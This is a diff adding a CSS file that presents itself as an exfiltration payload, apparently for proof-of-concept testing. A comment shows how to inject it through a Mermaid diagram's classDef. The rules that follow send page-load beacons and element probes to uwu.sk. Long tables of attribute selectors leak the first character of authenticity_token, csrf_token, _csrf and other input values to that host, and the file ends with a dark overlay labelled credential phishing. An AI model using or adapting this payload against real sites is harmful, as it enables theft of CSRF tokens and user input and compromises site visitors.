@@ -1,0 +1,259 @@
+/* uwu.sk/m.css — CSS exfiltration payload
+ *
+ * Usage in mermaid diagram:
+ *   stateDiagram-v2
+ *     classDef x content:"</style><style>@import url(https://uwu.sk/m.css);</style><style>a{b:c"
+ *     [*] --> Active
+ *     class Active x
+ *
+ * Monitor: check server access logs at uwu.sk for /c? requests
+ */
+
+/* ============================================================
+   1. VISUAL PROOF — red banner proves CSS applies page-wide
+   ============================================================ */
+body::before {
+  content: "INJECTED — external CSS loaded from uwu.sk/m.css" !important;
+  display: block !important;
+  position: fixed !important;
+  top: 0 !important;
+  left: 0 !important;
+  width: 100% !important;
+  background: #d32f2f !important;
+  color: white !important;
+  text-align: center !important;
+  padding: 10px !important;
+  font-size: 14px !important;
+  font-weight: bold !important;
+  font-family: monospace !important;
+  z-index: 999999 !important;
+  letter-spacing: 1px !important;
+}
+
+/* ============================================================
+   2. PAGE LOAD BEACON — fires on render, no click needed
+   ============================================================ */
+body {
+  background-image: url(https://uwu.sk/c?e=page_load) !important;
+}
+
+/* ============================================================
+   3. ELEMENT DETECTION — what's on the page?
+   ============================================================ */
+form::after            { content: url(https://uwu.sk/c?has=form)           !important; display: block !important; }
+body:has(textarea)::after { content: url(https://uwu.sk/c?has=textarea)    !important; display: block !important; }
+body:has(input[type="password"])::after { content: url(https://uwu.sk/c?has=password_field) !important; display: block !important; }
+body:has(input[type="hidden"])::after  { content: url(https://uwu.sk/c?has=hidden_input)   !important; display: block !important; }
+body:has(meta[name="csrf-token"])::after { content: url(https://uwu.sk/c?has=csrf_meta)    !important; display: block !important; }
+
+/* ============================================================
+   4. CSRF TOKEN EXFIL — authenticity_token (GitLab/Rails)
+      Extracts first character of hidden input value
+   ============================================================ */
+
+/* lowercase */
+form:has(input[name="authenticity_token"][value^="a"])::after{content:url(https://uwu.sk/c?n=at&v=a)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="b"])::after{content:url(https://uwu.sk/c?n=at&v=b)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="c"])::after{content:url(https://uwu.sk/c?n=at&v=c)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="d"])::after{content:url(https://uwu.sk/c?n=at&v=d)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="e"])::after{content:url(https://uwu.sk/c?n=at&v=e)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="f"])::after{content:url(https://uwu.sk/c?n=at&v=f)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="g"])::after{content:url(https://uwu.sk/c?n=at&v=g)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="h"])::after{content:url(https://uwu.sk/c?n=at&v=h)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="i"])::after{content:url(https://uwu.sk/c?n=at&v=i)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="j"])::after{content:url(https://uwu.sk/c?n=at&v=j)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="k"])::after{content:url(https://uwu.sk/c?n=at&v=k)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="l"])::after{content:url(https://uwu.sk/c?n=at&v=l)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="m"])::after{content:url(https://uwu.sk/c?n=at&v=m)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="n"])::after{content:url(https://uwu.sk/c?n=at&v=n)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="o"])::after{content:url(https://uwu.sk/c?n=at&v=o)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="p"])::after{content:url(https://uwu.sk/c?n=at&v=p)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="q"])::after{content:url(https://uwu.sk/c?n=at&v=q)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="r"])::after{content:url(https://uwu.sk/c?n=at&v=r)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="s"])::after{content:url(https://uwu.sk/c?n=at&v=s)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="t"])::after{content:url(https://uwu.sk/c?n=at&v=t)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="u"])::after{content:url(https://uwu.sk/c?n=at&v=u)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="v"])::after{content:url(https://uwu.sk/c?n=at&v=v)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="w"])::after{content:url(https://uwu.sk/c?n=at&v=w)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="x"])::after{content:url(https://uwu.sk/c?n=at&v=x)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="y"])::after{content:url(https://uwu.sk/c?n=at&v=y)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="z"])::after{content:url(https://uwu.sk/c?n=at&v=z)!important;display:block!important}
+/* uppercase */
+form:has(input[name="authenticity_token"][value^="A"])::after{content:url(https://uwu.sk/c?n=at&v=A)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="B"])::after{content:url(https://uwu.sk/c?n=at&v=B)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="C"])::after{content:url(https://uwu.sk/c?n=at&v=C)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="D"])::after{content:url(https://uwu.sk/c?n=at&v=D)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="E"])::after{content:url(https://uwu.sk/c?n=at&v=E)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="F"])::after{content:url(https://uwu.sk/c?n=at&v=F)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="G"])::after{content:url(https://uwu.sk/c?n=at&v=G)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="H"])::after{content:url(https://uwu.sk/c?n=at&v=H)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="I"])::after{content:url(https://uwu.sk/c?n=at&v=I)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="J"])::after{content:url(https://uwu.sk/c?n=at&v=J)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="K"])::after{content:url(https://uwu.sk/c?n=at&v=K)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="L"])::after{content:url(https://uwu.sk/c?n=at&v=L)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="M"])::after{content:url(https://uwu.sk/c?n=at&v=M)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="N"])::after{content:url(https://uwu.sk/c?n=at&v=N)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="O"])::after{content:url(https://uwu.sk/c?n=at&v=O)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="P"])::after{content:url(https://uwu.sk/c?n=at&v=P)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="Q"])::after{content:url(https://uwu.sk/c?n=at&v=Q)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="R"])::after{content:url(https://uwu.sk/c?n=at&v=R)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="S"])::after{content:url(https://uwu.sk/c?n=at&v=S)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="T"])::after{content:url(https://uwu.sk/c?n=at&v=T)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="U"])::after{content:url(https://uwu.sk/c?n=at&v=U)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="V"])::after{content:url(https://uwu.sk/c?n=at&v=V)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="W"])::after{content:url(https://uwu.sk/c?n=at&v=W)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="X"])::after{content:url(https://uwu.sk/c?n=at&v=X)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="Y"])::after{content:url(https://uwu.sk/c?n=at&v=Y)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="Z"])::after{content:url(https://uwu.sk/c?n=at&v=Z)!important;display:block!important}
+/* digits */
+form:has(input[name="authenticity_token"][value^="0"])::after{content:url(https://uwu.sk/c?n=at&v=0)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="1"])::after{content:url(https://uwu.sk/c?n=at&v=1)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="2"])::after{content:url(https://uwu.sk/c?n=at&v=2)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="3"])::after{content:url(https://uwu.sk/c?n=at&v=3)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="4"])::after{content:url(https://uwu.sk/c?n=at&v=4)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="5"])::after{content:url(https://uwu.sk/c?n=at&v=5)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="6"])::after{content:url(https://uwu.sk/c?n=at&v=6)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="7"])::after{content:url(https://uwu.sk/c?n=at&v=7)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="8"])::after{content:url(https://uwu.sk/c?n=at&v=8)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="9"])::after{content:url(https://uwu.sk/c?n=at&v=9)!important;display:block!important}
+/* base64 special */
+form:has(input[name="authenticity_token"][value^="+"])::after{content:url(https://uwu.sk/c?n=at&v=%2B)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="/"])::after{content:url(https://uwu.sk/c?n=at&v=%2F)!important;display:block!important}
+form:has(input[name="authenticity_token"][value^="="])::after{content:url(https://uwu.sk/c?n=at&v=%3D)!important;display:block!important}
+
+/* ============================================================
+   5. GENERIC CSRF — csrf_token, _csrf, _token, csrfmiddlewaretoken
+      First character scan
+   ============================================================ */
+
+/* csrf_token */
+form:has(input[name="csrf_token"][value^="a"]) { background: url(https://uwu.sk/c?n=csrf&v=a) !important }
+form:has(input[name="csrf_token"][value^="b"]) { background: url(https://uwu.sk/c?n=csrf&v=b) !important }
+form:has(input[name="csrf_token"][value^="c"]) { background: url(https://uwu.sk/c?n=csrf&v=c) !important }
+form:has(input[name="csrf_token"][value^="d"]) { background: url(https://uwu.sk/c?n=csrf&v=d) !important }
+form:has(input[name="csrf_token"][value^="e"]) { background: url(https://uwu.sk/c?n=csrf&v=e) !important }
+form:has(input[name="csrf_token"][value^="f"]) { background: url(https://uwu.sk/c?n=csrf&v=f) !important }
+form:has(input[name="csrf_token"][value^="g"]) { background: url(https://uwu.sk/c?n=csrf&v=g) !important }
+form:has(input[name="csrf_token"][value^="h"]) { background: url(https://uwu.sk/c?n=csrf&v=h) !important }
+form:has(input[name="csrf_token"][value^="i"]) { background: url(https://uwu.sk/c?n=csrf&v=i) !important }
+form:has(input[name="csrf_token"][value^="j"]) { background: url(https://uwu.sk/c?n=csrf&v=j) !important }
+form:has(input[name="csrf_token"][value^="k"]) { background: url(https://uwu.sk/c?n=csrf&v=k) !important }
+form:has(input[name="csrf_token"][value^="l"]) { background: url(https://uwu.sk/c?n=csrf&v=l) !important }
+form:has(input[name="csrf_token"][value^="m"]) { background: url(https://uwu.sk/c?n=csrf&v=m) !important }
+form:has(input[name="csrf_token"][value^="n"]) { background: url(https://uwu.sk/c?n=csrf&v=n) !important }
+form:has(input[name="csrf_token"][value^="o"]) { background: url(https://uwu.sk/c?n=csrf&v=o) !important }
+form:has(input[name="csrf_token"][value^="p"]) { background: url(https://uwu.sk/c?n=csrf&v=p) !important }
+form:has(input[name="csrf_token"][value^="q"]) { background: url(https://uwu.sk/c?n=csrf&v=q) !important }
+form:has(input[name="csrf_token"][value^="r"]) { background: url(https://uwu.sk/c?n=csrf&v=r) !important }
+form:has(input[name="csrf_token"][value^="s"]) { background: url(https://uwu.sk/c?n=csrf&v=s) !important }
+form:has(input[name="csrf_token"][value^="t"]) { background: url(https://uwu.sk/c?n=csrf&v=t) !important }
+form:has(input[name="csrf_token"][value^="u"]) { background: url(https://uwu.sk/c?n=csrf&v=u) !important }
+form:has(input[name="csrf_token"][value^="v"]) { background: url(https://uwu.sk/c?n=csrf&v=v) !important }
+form:has(input[name="csrf_token"][value^="w"]) { background: url(https://uwu.sk/c?n=csrf&v=w) !important }
+form:has(input[name="csrf_token"][value^="x"]) { background: url(https://uwu.sk/c?n=csrf&v=x) !important }
+form:has(input[name="csrf_token"][value^="y"]) { background: url(https://uwu.sk/c?n=csrf&v=y) !important }
+form:has(input[name="csrf_token"][value^="z"]) { background: url(https://uwu.sk/c?n=csrf&v=z) !important }
+form:has(input[name="csrf_token"][value^="0"]) { background: url(https://uwu.sk/c?n=csrf&v=0) !important }
+form:has(input[name="csrf_token"][value^="1"]) { background: url(https://uwu.sk/c?n=csrf&v=1) !important }
+form:has(input[name="csrf_token"][value^="2"]) { background: url(https://uwu.sk/c?n=csrf&v=2) !important }
+form:has(input[name="csrf_token"][value^="3"]) { background: url(https://uwu.sk/c?n=csrf&v=3) !important }
+form:has(input[name="csrf_token"][value^="4"]) { background: url(https://uwu.sk/c?n=csrf&v=4) !important }
+form:has(input[name="csrf_token"][value^="5"]) { background: url(https://uwu.sk/c?n=csrf&v=5) !important }
+form:has(input[name="csrf_token"][value^="6"]) { background: url(https://uwu.sk/c?n=csrf&v=6) !important }
+form:has(input[name="csrf_token"][value^="7"]) { background: url(https://uwu.sk/c?n=csrf&v=7) !important }
+form:has(input[name="csrf_token"][value^="8"]) { background: url(https://uwu.sk/c?n=csrf&v=8) !important }
+form:has(input[name="csrf_token"][value^="9"]) { background: url(https://uwu.sk/c?n=csrf&v=9) !important }
+
+/* _csrf */
+form:has(input[name="_csrf"][value^="a"]) { background: url(https://uwu.sk/c?n=_csrf&v=a) !important }
+form:has(input[name="_csrf"][value^="b"]) { background: url(https://uwu.sk/c?n=_csrf&v=b) !important }
+form:has(input[name="_csrf"][value^="c"]) { background: url(https://uwu.sk/c?n=_csrf&v=c) !important }
+form:has(input[name="_csrf"][value^="d"]) { background: url(https://uwu.sk/c?n=_csrf&v=d) !important }
+form:has(input[name="_csrf"][value^="e"]) { background: url(https://uwu.sk/c?n=_csrf&v=e) !important }
+form:has(input[name="_csrf"][value^="f"]) { background: url(https://uwu.sk/c?n=_csrf&v=f) !important }
+form:has(input[name="_csrf"][value^="g"]) { background: url(https://uwu.sk/c?n=_csrf&v=g) !important }
+form:has(input[name="_csrf"][value^="h"]) { background: url(https://uwu.sk/c?n=_csrf&v=h) !important }
+form:has(input[name="_csrf"][value^="i"]) { background: url(https://uwu.sk/c?n=_csrf&v=i) !important }
+form:has(input[name="_csrf"][value^="j"]) { background: url(https://uwu.sk/c?n=_csrf&v=j) !important }
+form:has(input[name="_csrf"][value^="k"]) { background: url(https://uwu.sk/c?n=_csrf&v=k) !important }
+form:has(input[name="_csrf"][value^="l"]) { background: url(https://uwu.sk/c?n=_csrf&v=l) !important }
+form:has(input[name="_csrf"][value^="m"]) { background: url(https://uwu.sk/c?n=_csrf&v=m) !important }
+form:has(input[name="_csrf"][value^="n"]) { background: url(https://uwu.sk/c?n=_csrf&v=n) !important }
+form:has(input[name="_csrf"][value^="o"]) { background: url(https://uwu.sk/c?n=_csrf&v=o) !important }
+form:has(input[name="_csrf"][value^="p"]) { background: url(https://uwu.sk/c?n=_csrf&v=p) !important }
+form:has(input[name="_csrf"][value^="q"]) { background: url(https://uwu.sk/c?n=_csrf&v=q) !important }
+form:has(input[name="_csrf"][value^="r"]) { background: url(https://uwu.sk/c?n=_csrf&v=r) !important }
+form:has(input[name="_csrf"][value^="s"]) { background: url(https://uwu.sk/c?n=_csrf&v=s) !important }
+form:has(input[name="_csrf"][value^="t"]) { background: url(https://uwu.sk/c?n=_csrf&v=t) !important }
+form:has(input[name="_csrf"][value^="u"]) { background: url(https://uwu.sk/c?n=_csrf&v=u) !important }
+form:has(input[name="_csrf"][value^="v"]) { background: url(https://uwu.sk/c?n=_csrf&v=v) !important }
+form:has(input[name="_csrf"][value^="w"]) { background: url(https://uwu.sk/c?n=_csrf&v=w) !important }
+form:has(input[name="_csrf"][value^="x"]) { background: url(https://uwu.sk/c?n=_csrf&v=x) !important }
+form:has(input[name="_csrf"][value^="y"]) { background: url(https://uwu.sk/c?n=_csrf&v=y) !important }
+form:has(input[name="_csrf"][value^="z"]) { background: url(https://uwu.sk/c?n=_csrf&v=z) !important }
+form:has(input[name="_csrf"][value^="0"]) { background: url(https://uwu.sk/c?n=_csrf&v=0) !important }
+form:has(input[name="_csrf"][value^="1"]) { background: url(https://uwu.sk/c?n=_csrf&v=1) !important }
+form:has(input[name="_csrf"][value^="2"]) { background: url(https://uwu.sk/c?n=_csrf&v=2) !important }
+form:has(input[name="_csrf"][value^="3"]) { background: url(https://uwu.sk/c?n=_csrf&v=3) !important }
+form:has(input[name="_csrf"][value^="4"]) { background: url(https://uwu.sk/c?n=_csrf&v=4) !important }
+form:has(input[name="_csrf"][value^="5"]) { background: url(https://uwu.sk/c?n=_csrf&v=5) !important }
+form:has(input[name="_csrf"][value^="6"]) { background: url(https://uwu.sk/c?n=_csrf&v=6) !important }
+form:has(input[name="_csrf"][value^="7"]) { background: url(https://uwu.sk/c?n=_csrf&v=7) !important }
+form:has(input[name="_csrf"][value^="8"]) { background: url(https://uwu.sk/c?n=_csrf&v=8) !important }
+form:has(input[name="_csrf"][value^="9"]) { background: url(https://uwu.sk/c?n=_csrf&v=9) !important }
+
+/* ============================================================
+   6. VISIBLE INPUT VALUE EXFIL — any input with value attribute
+   ============================================================ */
+input[value^="a"] { background: url(https://uwu.sk/c?input=a) !important }
+input[value^="b"] { background: url(https://uwu.sk/c?input=b) !important }
+input[value^="c"] { background: url(https://uwu.sk/c?input=c) !important }
+input[value^="d"] { background: url(https://uwu.sk/c?input=d) !important }
+input[value^="e"] { background: url(https://uwu.sk/c?input=e) !important }
+input[value^="f"] { background: url(https://uwu.sk/c?input=f) !important }
+input[value^="g"] { background: url(https://uwu.sk/c?input=g) !important }
+input[value^="h"] { background: url(https://uwu.sk/c?input=h) !important }
+input[value^="i"] { background: url(https://uwu.sk/c?input=i) !important }
+input[value^="j"] { background: url(https://uwu.sk/c?input=j) !important }
+input[value^="k"] { background: url(https://uwu.sk/c?input=k) !important }
+input[value^="l"] { background: url(https://uwu.sk/c?input=l) !important }
+input[value^="m"] { background: url(https://uwu.sk/c?input=m) !important }
+input[value^="n"] { background: url(https://uwu.sk/c?input=n) !important }
+input[value^="o"] { background: url(https://uwu.sk/c?input=o) !important }
+input[value^="p"] { background: url(https://uwu.sk/c?input=p) !important }
+input[value^="q"] { background: url(https://uwu.sk/c?input=q) !important }
+input[value^="r"] { background: url(https://uwu.sk/c?input=r) !important }
+input[value^="s"] { background: url(https://uwu.sk/c?input=s) !important }
+input[value^="t"] { background: url(https://uwu.sk/c?input=t) !important }
+input[value^="u"] { background: url(https://uwu.sk/c?input=u) !important }
+input[value^="v"] { background: url(https://uwu.sk/c?input=v) !important }
+input[value^="w"] { background: url(https://uwu.sk/c?input=w) !important }
+input[value^="x"] { background: url(https://uwu.sk/c?input=x) !important }
+input[value^="y"] { background: url(https://uwu.sk/c?input=y) !important }
+input[value^="z"] { background: url(https://uwu.sk/c?input=z) !important }
+input[value^="0"] { background: url(https://uwu.sk/c?input=0) !important }
+input[value^="1"] { background: url(https://uwu.sk/c?input=1) !important }
+input[value^="2"] { background: url(https://uwu.sk/c?input=2) !important }
+input[value^="3"] { background: url(https://uwu.sk/c?input=3) !important }
+input[value^="4"] { background: url(https://uwu.sk/c?input=4) !important }
+input[value^="5"] { background: url(https://uwu.sk/c?input=5) !important }
+input[value^="6"] { background: url(https://uwu.sk/c?input=6) !important }
+input[value^="7"] { background: url(https://uwu.sk/c?input=7) !important }
+input[value^="8"] { background: url(https://uwu.sk/c?input=8) !important }
+input[value^="9"] { background: url(https://uwu.sk/c?input=9) !important }
+
+/* ============================================================
+   7. CREDENTIAL PHISHING — inject fake login over page
+   ============================================================ */
+body::after {
+  content: "" !important;
+  display: block !important;
+  position: fixed !important;
+  top: 0 !important;
+  left: 0 !important;
+  width: 100vw !important;
+  height: 100vh !important;
+  background: rgba(0,0,0,0.6) !important;
+  z-index: 999998 !important;
+  pointer-events: none !important;
+}
